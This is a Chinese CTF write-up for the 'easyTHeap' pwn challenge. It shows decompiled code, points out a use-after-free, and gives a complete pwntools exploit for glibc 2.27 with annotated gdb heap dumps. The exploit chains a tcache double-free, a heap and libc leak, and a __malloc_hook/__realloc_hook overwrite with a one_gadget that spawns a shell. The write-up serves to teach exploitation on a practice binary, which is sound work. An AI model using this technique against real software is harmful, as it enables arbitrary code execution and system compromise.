---
layout: post
title:  easyTHeap
date:   2021-02-25 00:01:01 +0300
image:  2021-02-25-bridge.jpg
tags:   [ctf,Pwn,V&N2020公开赛,ubuntu18,heap,tcache,HouseOfSpirit]
---

#### main()

```assembly
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  sub_A39(a1, a2, a3);
  puts("Welcome to V&N challange!");
  puts("This's a tcache heap for you.");
  while ( 1 )
  {
    menu();
    sub_9EA();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        if ( !qword_202018 )
          exit(0);
        add();
        --qword_202018;
        break;
      case 2u:
        edit();
        break;
      case 3u:
        show();
        break;
      case 4u:
        if ( !qword_202010 )
        {
          puts("NoNoNo!");
          exit(0);
        }
        delete();
        --qword_202010;
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("Please input current choice.");
        break;
    }
  }
}
```

#### menu()

```
int sub_DCF()
{
  puts("1.Add");
  puts("2.Edit");
  puts("3.Show");
  puts("4.Delete");
  puts("5.Exit");
  return printf("choice: ");
}
```

#### add()

```assembly
signed int add()
{
  signed int result; // eax
  int v1; // [rsp+8h] [rbp-8h]
  signed int v2; // [rsp+Ch] [rbp-4h]

  v1 = sub_AB2();
  if ( v1 == -1 )
    return puts("Full");
  printf("size?");
  result = sub_9EA();
  v2 = result;
  if ( result > 0 && result <= 256 )
  {
    qword_202080[v1] = malloc(result);
    if ( !qword_202080[v1] )
    {
      puts("Something Wrong!");
      exit(-1);
    }
    dword_202060[v1] = v2;
    result = puts("Done!");
  }
  return result;
}
```

有两个全局数组，一个数组qword_202080用来储存堆块的地址，另一个数组dword_202060用来储存每个堆块的大小size。

可申请堆块的大小只能小于等于256字节。

#### edit()

```assembly
int sub_BEA()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  printf("content:");
  read(0, (void *)qword_202080[v1], (unsigned int)dword_202060[v1]);
  return puts("Done!");
}
```

输入数据不能溢出，大小由dword_202060数组储存的size限制。

#### show()

```assembly
int sub_CA4()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  puts((const char *)qword_202080[v1]);
  return puts("Done!");
}
```

#### delete()

```assembly
int sub_D2C()
{
  int v1; // [rsp+Ch] [rbp-4h]

  printf("idx?");
  v1 = sub_9EA();
  if ( v1 < 0 || v1 > 6 || !qword_202080[v1] )
    exit(0);
  free((void *)qword_202080[v1]);
  dword_202060[v1] = 0;
  return puts("Done!");
}
```

free数组qword_202080中储存的堆块地址指向的空间。但是指向内存的指针没有指令。存在UAF漏洞。

数组dword_202060储存的size大小置零。

#### exp：

```assembly
# -*-coding:utf-8-*-
from pwn import *

libc = ELF("./libc-2.27.so")

# io = process("./vn_pwn_easyTHeap")
io = remote("node3.buuoj.cn", 28883)

def add(size):
    io.recvuntil("choice: ")
    io.sendline(str(1))
    io.recvuntil("size?")
    io.sendline(str(size))

def edit(index, content):
    io.recvuntil("choice: ")
    io.sendline(str(2))
    io.recvuntil("idx?")
    io.sendline(str(index))
    io.recvuntil("content:")
    io.sendline(content)

def show(index):
    io.recvuntil("choice: ")
    io.sendline(str(3))
    io.recvuntil("idx?")
    io.sendline(str(index))

def delete(index):
    io.recvuntil("choice: ")
    io.sendline(str(4))
    io.recvuntil("idx?")
    io.sendline(str(index))

add(0x50)
delete(0)
'''
0x55879d93c000:	0x0000000000000000	0x0000000000000251
0x55879d93c010:	0x0000000100000000	0x0000000000000000
0x55879d93c020:	0x0000000000000000	0x0000000000000000
0x55879d93c030:	0x0000000000000000	0x0000000000000000
0x55879d93c040:	0x0000000000000000	0x0000000000000000
0x55879d93c050:	0x0000000000000000	0x0000000000000000
0x55879d93c060:	0x0000000000000000	0x0000000000000000
0x55879d93c070:	0x000055879d93c260	0x0000000000000000
0x55879d93c080:	0x0000000000000000	0x0000000000000000
0x55879d93c090:	0x0000000000000000	0x0000000000000000
0x55879d93c0a0:	0x0000000000000000	0x0000000000000000
0x55879d93c0b0:	0x0000000000000000	0x0000000000000000
0x55879d93c0c0:	0x0000000000000000	0x0000000000000000
0x55879d93c0d0:	0x0000000000000000	0x0000000000000000
0x55879d93c0e0:	0x0000000000000000	0x0000000000000000
0x55879d93c0f0:	0x0000000000000000	0x0000000000000000
0x55879d93c100:	0x0000000000000000	0x0000000000000000
0x55879d93c110:	0x0000000000000000	0x0000000000000000
0x55879d93c120:	0x0000000000000000	0x0000000000000000
0x55879d93c130:	0x0000000000000000	0x0000000000000000
0x55879d93c140:	0x0000000000000000	0x0000000000000000
0x55879d93c150:	0x0000000000000000	0x0000000000000000
0x55879d93c160:	0x0000000000000000	0x0000000000000000
0x55879d93c170:	0x0000000000000000	0x0000000000000000
0x55879d93c180:	0x0000000000000000	0x0000000000000000
0x55879d93c190:	0x0000000000000000	0x0000000000000000
0x55879d93c1a0:	0x0000000000000000	0x0000000000000000
0x55879d93c1b0:	0x0000000000000000	0x0000000000000000
0x55879d93c1c0:	0x0000000000000000	0x0000000000000000
0x55879d93c1d0:	0x0000000000000000	0x0000000000000000
0x55879d93c1e0:	0x0000000000000000	0x0000000000000000
0x55879d93c1f0:	0x0000000000000000	0x0000000000000000
0x55879d93c200:	0x0000000000000000	0x0000000000000000
0x55879d93c210:	0x0000000000000000	0x0000000000000000
0x55879d93c220:	0x0000000000000000	0x0000000000000000
0x55879d93c230:	0x0000000000000000	0x0000000000000000
0x55879d93c240:	0x0000000000000000	0x0000000000000000
0x55879d93c250:	0x0000000000000000	0x0000000000000061
0x55879d93c260:	0x0000000000000000	0x0000000000000000
0x55879d93c270:	0x0000000000000000	0x0000000000000000
0x55879d93c280:	0x0000000000000000	0x0000000000000000
0x55879d93c290:	0x0000000000000000	0x0000000000000000
0x55879d93c2a0:	0x0000000000000000	0x0000000000000000
0x55879d93c2b0:	0x0000000000000000
'''

# free两次，程序并不会crash，这得益于tcache：
delete(0)
'''
0x5651ddf4e000:	0x0000000000000000	0x0000000000000251
0x5651ddf4e010:	0x0000000200000000	0x0000000000000000
0x5651ddf4e020:	0x0000000000000000	0x0000000000000000
0x5651ddf4e030:	0x0000000000000000	0x0000000000000000
0x5651ddf4e040:	0x0000000000000000	0x0000000000000000
0x5651ddf4e050:	0x0000000000000000	0x0000000000000000
0x5651ddf4e060:	0x0000000000000000	0x0000000000000000
0x5651ddf4e070:	0x00005651ddf4e260	0x0000000000000000
0x5651ddf4e080:	0x0000000000000000	0x0000000000000000
0x5651ddf4e090:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0a0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0b0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0c0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0d0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0e0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e0f0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e100:	0x0000000000000000	0x0000000000000000
0x5651ddf4e110:	0x0000000000000000	0x0000000000000000
0x5651ddf4e120:	0x0000000000000000	0x0000000000000000
0x5651ddf4e130:	0x0000000000000000	0x0000000000000000
0x5651ddf4e140:	0x0000000000000000	0x0000000000000000
0x5651ddf4e150:	0x0000000000000000	0x0000000000000000
0x5651ddf4e160:	0x0000000000000000	0x0000000000000000
0x5651ddf4e170:	0x0000000000000000	0x0000000000000000
0x5651ddf4e180:	0x0000000000000000	0x0000000000000000
0x5651ddf4e190:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1a0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1b0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1c0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1d0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1e0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e1f0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e200:	0x0000000000000000	0x0000000000000000
0x5651ddf4e210:	0x0000000000000000	0x0000000000000000
0x5651ddf4e220:	0x0000000000000000	0x0000000000000000
0x5651ddf4e230:	0x0000000000000000	0x0000000000000000
0x5651ddf4e240:	0x0000000000000000	0x0000000000000000
0x5651ddf4e250:	0x0000000000000000	0x0000000000000061 0
0x5651ddf4e260:	0x00005651ddf4e260	0x0000000000000000 自身的地址
0x5651ddf4e270:	0x0000000000000000	0x0000000000000000
0x5651ddf4e280:	0x0000000000000000	0x0000000000000000
0x5651ddf4e290:	0x0000000000000000	0x0000000000000000
0x5651ddf4e2a0:	0x0000000000000000	0x0000000000000000
0x5651ddf4e2b0:	0x0000000000000000
'''

show(0)
# 千万不要这样写
# addr = u64(io.recv(8))
heap_base = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(heap_base))

add(0x50) # 1
edit(1, p64(heap_base - 0x250))

add(0x50) # 2
'''
0x55e89a0e2000:	0x0000000000000000	0x0000000000000251
0x55e89a0e2010:	0x0000000000000000	0x0000000000000000
0x55e89a0e2020:	0x0000000000000000	0x0000000000000000
0x55e89a0e2030:	0x0000000000000000	0x0000000000000000
0x55e89a0e2040:	0x0000000000000000	0x0000000000000000
0x55e89a0e2050:	0x0000000000000000	0x0000000000000000
0x55e89a0e2060:	0x0000000000000000	0x0000000000000000
0x55e89a0e2070:	0x000055e89a0e2010	0x0000000000000000
0x55e89a0e2080:	0x0000000000000000	0x0000000000000000
0x55e89a0e2090:	0x0000000000000000	0x0000000000000000
0x55e89a0e20a0:	0x0000000000000000	0x0000000000000000
0x55e89a0e20b0:	0x0000000000000000	0x0000000000000000
0x55e89a0e20c0:	0x0000000000000000	0x0000000000000000
0x55e89a0e20d0:	0x0000000000000000	0x0000000000000000
0x55e89a0e20e0:	0x0000000000000000	0x0000000000000000
0x55e89a0e20f0:	0x0000000000000000	0x0000000000000000
0x55e89a0e2100:	0x0000000000000000	0x0000000000000000
0x55e89a0e2110:	0x0000000000000000	0x0000000000000000
0x55e89a0e2120:	0x0000000000000000	0x0000000000000000
0x55e89a0e2130:	0x0000000000000000	0x0000000000000000
0x55e89a0e2140:	0x0000000000000000	0x0000000000000000
0x55e89a0e2150:	0x0000000000000000	0x0000000000000000
0x55e89a0e2160:	0x0000000000000000	0x0000000000000000
0x55e89a0e2170:	0x0000000000000000	0x0000000000000000
0x55e89a0e2180:	0x0000000000000000	0x0000000000000000
0x55e89a0e2190:	0x0000000000000000	0x0000000000000000
0x55e89a0e21a0:	0x0000000000000000	0x0000000000000000
0x55e89a0e21b0:	0x0000000000000000	0x0000000000000000
0x55e89a0e21c0:	0x0000000000000000	0x0000000000000000
0x55e89a0e21d0:	0x0000000000000000	0x0000000000000000
0x55e89a0e21e0:	0x0000000000000000	0x0000000000000000
0x55e89a0e21f0:	0x0000000000000000	0x0000000000000000
0x55e89a0e2200:	0x0000000000000000	0x0000000000000000
0x55e89a0e2210:	0x0000000000000000	0x0000000000000000
0x55e89a0e2220:	0x0000000000000000	0x0000000000000000
0x55e89a0e2230:	0x0000000000000000	0x0000000000000000
0x55e89a0e2240:	0x0000000000000000	0x0000000000000000
0x55e89a0e2250:	0x0000000000000000	0x0000000000000061 1/2
0x55e89a0e2260:	0x000055e89a0e2010	0x000000000000000a
0x55e89a0e2270:	0x0000000000000000	0x0000000000000000
0x55e89a0e2280:	0x0000000000000000	0x0000000000000000
0x55e89a0e2290:	0x0000000000000000	0x0000000000000000
0x55e89a0e22a0:	0x0000000000000000	0x0000000000000000
0x55e89a0e22b0:	0x0000000000000000
'''

add(0x50) # 3
'''
0x5561deb02000:	0x0000000000000000	0x0000000000000251 3
0x5561deb02010:	0x000000ff00000000	0x0000000000000000
0x5561deb02020:	0x0000000000000000	0x0000000000000000
0x5561deb02030:	0x0000000000000000	0x0000000000000000
0x5561deb02040:	0x0000000000000000	0x0000000000000000
0x5561deb02050:	0x0000000000000000	0x0000000000000000
0x5561deb02060:	0x0000000000000000	0x0000000000000000
0x5561deb02070:	0x0000000000000000	0x0000000000000000
0x5561deb02080:	0x0000000000000000	0x0000000000000000
0x5561deb02090:	0x0000000000000000	0x0000000000000000
0x5561deb020a0:	0x0000000000000000	0x0000000000000000
0x5561deb020b0:	0x0000000000000000	0x0000000000000000
0x5561deb020c0:	0x0000000000000000	0x0000000000000000
0x5561deb020d0:	0x0000000000000000	0x0000000000000000
0x5561deb020e0:	0x0000000000000000	0x0000000000000000
0x5561deb020f0:	0x0000000000000000	0x0000000000000000
0x5561deb02100:	0x0000000000000000	0x0000000000000000
0x5561deb02110:	0x0000000000000000	0x0000000000000000
0x5561deb02120:	0x0000000000000000	0x0000000000000000
0x5561deb02130:	0x0000000000000000	0x0000000000000000
0x5561deb02140:	0x0000000000000000	0x0000000000000000
0x5561deb02150:	0x0000000000000000	0x0000000000000000
0x5561deb02160:	0x0000000000000000	0x0000000000000000
0x5561deb02170:	0x0000000000000000	0x0000000000000000
0x5561deb02180:	0x0000000000000000	0x0000000000000000
0x5561deb02190:	0x0000000000000000	0x0000000000000000
0x5561deb021a0:	0x0000000000000000	0x0000000000000000
0x5561deb021b0:	0x0000000000000000	0x0000000000000000
0x5561deb021c0:	0x0000000000000000	0x0000000000000000
0x5561deb021d0:	0x0000000000000000	0x0000000000000000
0x5561deb021e0:	0x0000000000000000	0x0000000000000000
0x5561deb021f0:	0x0000000000000000	0x0000000000000000
0x5561deb02200:	0x0000000000000000	0x0000000000000000
0x5561deb02210:	0x0000000000000000	0x0000000000000000
0x5561deb02220:	0x0000000000000000	0x0000000000000000
0x5561deb02230:	0x0000000000000000	0x0000000000000000
0x5561deb02240:	0x0000000000000000	0x0000000000000000
0x5561deb02250:	0x0000000000000000	0x0000000000000061 1/2
0x5561deb02260:	0x00005561deb02010	0x000000000000000a
0x5561deb02270:	0x0000000000000000	0x0000000000000000
0x5561deb02280:	0x0000000000000000	0x0000000000000000
0x5561deb02290:	0x0000000000000000	0x0000000000000000
0x5561deb022a0:	0x0000000000000000	0x0000000000000000
0x5561deb022b0:	0x0000000000000000
'''

edit(3, "a" * 0x28)
'''
0x565378b4d000:	0x0000000000000000	0x0000000000000251 3
0x565378b4d010:	0x6161616161616161	0x6161616161616161
0x565378b4d020:	0x6161616161616161	0x6161616161616161
0x565378b4d030:	0x6161616161616161	0x000000000000000a
0x565378b4d040:	0x0000000000000000	0x0000000000000000
0x565378b4d050:	0x0000000000000000	0x0000000000000000
0x565378b4d060:	0x0000000000000000	0x0000000000000000
0x565378b4d070:	0x0000000000000000	0x0000000000000000
0x565378b4d080:	0x0000000000000000	0x0000000000000000
0x565378b4d090:	0x0000000000000000	0x0000000000000000
0x565378b4d0a0:	0x0000000000000000	0x0000000000000000
0x565378b4d0b0:	0x0000000000000000	0x0000000000000000
0x565378b4d0c0:	0x0000000000000000	0x0000000000000000
0x565378b4d0d0:	0x0000000000000000	0x0000000000000000
0x565378b4d0e0:	0x0000000000000000	0x0000000000000000
0x565378b4d0f0:	0x0000000000000000	0x0000000000000000
0x565378b4d100:	0x0000000000000000	0x0000000000000000
0x565378b4d110:	0x0000000000000000	0x0000000000000000
0x565378b4d120:	0x0000000000000000	0x0000000000000000
0x565378b4d130:	0x0000000000000000	0x0000000000000000
0x565378b4d140:	0x0000000000000000	0x0000000000000000
0x565378b4d150:	0x0000000000000000	0x0000000000000000
0x565378b4d160:	0x0000000000000000	0x0000000000000000
0x565378b4d170:	0x0000000000000000	0x0000000000000000
0x565378b4d180:	0x0000000000000000	0x0000000000000000
0x565378b4d190:	0x0000000000000000	0x0000000000000000
0x565378b4d1a0:	0x0000000000000000	0x0000000000000000
0x565378b4d1b0:	0x0000000000000000	0x0000000000000000
0x565378b4d1c0:	0x0000000000000000	0x0000000000000000
0x565378b4d1d0:	0x0000000000000000	0x0000000000000000
0x565378b4d1e0:	0x0000000000000000	0x0000000000000000
0x565378b4d1f0:	0x0000000000000000	0x0000000000000000
0x565378b4d200:	0x0000000000000000	0x0000000000000000
0x565378b4d210:	0x0000000000000000	0x0000000000000000
0x565378b4d220:	0x0000000000000000	0x0000000000000000
0x565378b4d230:	0x0000000000000000	0x0000000000000000
0x565378b4d240:	0x0000000000000000	0x0000000000000000
0x565378b4d250:	0x0000000000000000	0x0000000000000061 1/2
0x565378b4d260:	0x0000565378b4d010	0x000000000000000a
0x565378b4d270:	0x0000000000000000	0x0000000000000000
0x565378b4d280:	0x0000000000000000	0x0000000000000000
0x565378b4d290:	0x0000000000000000	0x0000000000000000
0x565378b4d2a0:	0x0000000000000000	0x0000000000000000
0x565378b4d2b0:	0x0000000000000000
'''

delete(3)
'''
0x55982ff2b000:	0x0000000000000000	0x0000000000000251 3
0x55982ff2b010:	0x00007f6071d20ca0	0x00007f6071d20ca0 unsorted bin
0x55982ff2b020:	0x6161616161616161	0x6161616161616161
0x55982ff2b030:	0x6161616161616161	0x000000000000000a
0x55982ff2b040:	0x0000000000000000	0x0000000000000000
0x55982ff2b050:	0x0000000000000000	0x0000000000000000
0x55982ff2b060:	0x0000000000000000	0x0000000000000000
0x55982ff2b070:	0x0000000000000000	0x0000000000000000
0x55982ff2b080:	0x0000000000000000	0x0000000000000000
0x55982ff2b090:	0x0000000000000000	0x0000000000000000
0x55982ff2b0a0:	0x0000000000000000	0x0000000000000000
0x55982ff2b0b0:	0x0000000000000000	0x0000000000000000
0x55982ff2b0c0:	0x0000000000000000	0x0000000000000000
0x55982ff2b0d0:	0x0000000000000000	0x0000000000000000
0x55982ff2b0e0:	0x0000000000000000	0x0000000000000000
0x55982ff2b0f0:	0x0000000000000000	0x0000000000000000
0x55982ff2b100:	0x0000000000000000	0x0000000000000000
0x55982ff2b110:	0x0000000000000000	0x0000000000000000
0x55982ff2b120:	0x0000000000000000	0x0000000000000000
0x55982ff2b130:	0x0000000000000000	0x0000000000000000
0x55982ff2b140:	0x0000000000000000	0x0000000000000000
0x55982ff2b150:	0x0000000000000000	0x0000000000000000
0x55982ff2b160:	0x0000000000000000	0x0000000000000000
0x55982ff2b170:	0x0000000000000000	0x0000000000000000
0x55982ff2b180:	0x0000000000000000	0x0000000000000000
0x55982ff2b190:	0x0000000000000000	0x0000000000000000
0x55982ff2b1a0:	0x0000000000000000	0x0000000000000000
0x55982ff2b1b0:	0x0000000000000000	0x0000000000000000
0x55982ff2b1c0:	0x0000000000000000	0x0000000000000000
0x55982ff2b1d0:	0x0000000000000000	0x0000000000000000
0x55982ff2b1e0:	0x0000000000000000	0x0000000000000000
0x55982ff2b1f0:	0x0000000000000000	0x0000000000000000
0x55982ff2b200:	0x0000000000000000	0x0000000000000000
0x55982ff2b210:	0x0000000000000000	0x0000000000000000
0x55982ff2b220:	0x0000000000000000	0x0000000000000000
0x55982ff2b230:	0x0000000000000000	0x0000000000000000
0x55982ff2b240:	0x0000000000000000	0x0000000000000000
0x55982ff2b250:	0x0000000000000250	0x0000000000000060 1/2
0x55982ff2b260:	0x000055982ff2b010	0x000000000000000a
0x55982ff2b270:	0x0000000000000000	0x0000000000000000
0x55982ff2b280:	0x0000000000000000	0x0000000000000000
0x55982ff2b290:	0x0000000000000000	0x0000000000000000
0x55982ff2b2a0:	0x0000000000000000	0x0000000000000000
0x55982ff2b2b0:	0x0000000000000000
'''
'''
gdb-peda$ x/50gx 0x00007f6071d20c10
0x7f6071d20c10 <_IO_wide_data_0+304>:	0x00007f6071d1cd60	0x0000000000000000
0x7f6071d20c20 <__memalign_hook>:	0x00007f60719cc480	0x00007f60719cd800
0x7f6071d20c30 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c40 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c50 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c60 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c80 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7f6071d20c90 <main_arena+80>:	0x0000000000000000	0x0000000000000000
0x7f6071d20ca0 <main_arena+96>:	0x000055982ff2b2b0	0x0000000000000000
0x7f6071d20cb0 <main_arena+112>:	0x000055982ff2b000	0x000055982ff2b000
'''

show(3)
unsorted = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(unsorted))

'''
./main_arena libc-2.27.so 
[+]libc version : glibc 2.27
[+]build ID : BuildID[sha1]=b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
[+]main_arena_offset : 0x3ebc40
'''

base = unsorted - 96 - 0x3ebc40
malloc_hook = base + libc.symbols["__malloc_hook"]
realloc = base + libc.symbols["__libc_realloc"]
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
onegadget = [0x4f2c5, 0x4f322, 0x10a38c]
onegadget = base + onegadget[2]

add(0x50) # 4
edit(4, "b" * 0x48 + p64(malloc_hook - 0x13))
'''
0x55f196a26000:	0x0000000000000000	0x0000000000000061 4
0x55f196a26010:	0x6262626262626262	0x6262626262626262
0x55f196a26020:	0x6262626262626262	0x6262626262626262
0x55f196a26030:	0x6262626262626262	0x6262626262626262
0x55f196a26040:	0x6262626262626262	0x6262626262626262
0x55f196a26050:	0x6262626262626262	0x00007f9a80715c1d
0x55f196a26060:	0x0000000000000000	0x00000000000001f1 unsortedbin
0x55f196a26070:	0x00007f9a80715ca0	0x00007f9a80715ca0
0x55f196a26080:	0x0000000000000000	0x0000000000000000
0x55f196a26090:	0x0000000000000000	0x0000000000000000
0x55f196a260a0:	0x0000000000000000	0x0000000000000000
0x55f196a260b0:	0x0000000000000000	0x0000000000000000
0x55f196a260c0:	0x0000000000000000	0x0000000000000000
0x55f196a260d0:	0x0000000000000000	0x0000000000000000
0x55f196a260e0:	0x0000000000000000	0x0000000000000000
0x55f196a260f0:	0x0000000000000000	0x0000000000000000
0x55f196a26100:	0x0000000000000000	0x0000000000000000
0x55f196a26110:	0x0000000000000000	0x0000000000000000
0x55f196a26120:	0x0000000000000000	0x0000000000000000
0x55f196a26130:	0x0000000000000000	0x0000000000000000
0x55f196a26140:	0x0000000000000000	0x0000000000000000
0x55f196a26150:	0x0000000000000000	0x0000000000000000
0x55f196a26160:	0x0000000000000000	0x0000000000000000
0x55f196a26170:	0x0000000000000000	0x0000000000000000
0x55f196a26180:	0x0000000000000000	0x0000000000000000
0x55f196a26190:	0x0000000000000000	0x0000000000000000
0x55f196a261a0:	0x0000000000000000	0x0000000000000000
0x55f196a261b0:	0x0000000000000000	0x0000000000000000
0x55f196a261c0:	0x0000000000000000	0x0000000000000000
0x55f196a261d0:	0x0000000000000000	0x0000000000000000
0x55f196a261e0:	0x0000000000000000	0x0000000000000000
0x55f196a261f0:	0x0000000000000000	0x0000000000000000
0x55f196a26200:	0x0000000000000000	0x0000000000000000
0x55f196a26210:	0x0000000000000000	0x0000000000000000
0x55f196a26220:	0x0000000000000000	0x0000000000000000
0x55f196a26230:	0x0000000000000000	0x0000000000000000
0x55f196a26240:	0x0000000000000000	0x0000000000000000
0x55f196a26250:	0x00000000000001f0	0x0000000000000060 1/2
0x55f196a26260:	0x000055f196a26010	0x000000000000000a
0x55f196a26270:	0x0000000000000000	0x0000000000000000
0x55f196a26280:	0x0000000000000000	0x0000000000000000
0x55f196a26290:	0x0000000000000000	0x0000000000000000
0x55f196a262a0:	0x0000000000000000	0x0000000000000000
0x55f196a262b0:	0x0000000000000000
'''

# realloc在库函数中的作用是重新调整malloc或calloc所分配的堆大小。
# 有些情况下one_gadget因为环境原因全部都不可用，这时可以通过realloc_hook来调整堆栈环境使one_gadget可用。
# realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。
# realloc_hook同malloc_hook相邻，故可通过fastbin attack一同修改两个值。
# 实际上就是把one_gadget写入到realloc_hook中，然后把realloc_hook写入malloc_hook中.
# 实际运行顺序：
# malloc -> malloc_hook -> realloc -> realloc_hook -> onegadget
add(0x20) # 5
edit(5, "\x00" * (0x13 - 0x8) + p64(onegadget) + p64(realloc + 8))
'''
gdb-peda$ x/30gx 0x00007ff25ad2fc10
0x7ff25ad2fc10 <_IO_wide_data_0+304>:	0x00007ff25ad2bd60	0x0000000000000000
0x7ff25ad2fc20 <__memalign_hook>:	0x0000000000000000	0x00007ff25aa4e38c onegedget
0x7ff25ad2fc30 <__malloc_hook>:	0x00007ff25a9dcc38	0x000000000000000a
0x7ff25ad2fc40 <main_arena>:	0x0000000000000000	0x0000000000000000
'''

add(0x10)

# gdb.attach(io)
# raw_input()

io.interactive()
```

